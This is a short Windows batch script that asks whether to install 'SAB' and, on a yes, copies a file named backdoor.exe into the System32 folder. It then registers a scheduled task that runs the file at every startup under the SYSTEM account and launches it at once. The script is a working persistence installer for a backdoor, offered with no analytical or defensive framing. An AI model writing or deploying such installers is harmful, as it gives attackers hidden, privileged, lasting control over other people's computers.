@echo off
set /P input=Do you wish to install SAB (Y/N)? 
if "%input%"=="" goto error
if "%input%"=="Y" goto install
if "%input%"=="y" goto install
if "%input%"=="N" goto endof
if "%input%"=="n" goto endof

:error
echo You forgot to type (Y/N)...
exit

:install
copy backdoor.exe %WinDir%\System32\
schtasks /Create /SC ONSTART /TN SAB /TR %WinDir%\System32\backdoor.exe /RU SYSTEM
schtasks /Run /TN SAB
echo Done installing app...
pause

:endof
